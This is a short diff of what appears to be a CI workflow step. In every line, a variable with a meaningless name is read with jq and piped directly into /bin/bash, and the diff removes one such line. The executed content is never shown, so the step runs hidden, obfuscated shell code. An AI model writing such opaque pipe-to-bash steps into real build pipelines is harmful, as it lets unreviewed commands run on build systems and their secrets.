@@ -24,7 +24,6 @@ jobs:
           echo $t088 | jq -r .zr9567 | /bin/bash
           echo $kz9641 | jq -r .u0 | /bin/bash
           echo $c8 | jq -r .zgsc78780 | /bin/bash
-          echo $deir503 | jq -r .qxdk4 | /bin/bash
           echo $m0 | jq -r .rzau31 | /bin/bash
 
       - name: Archive data
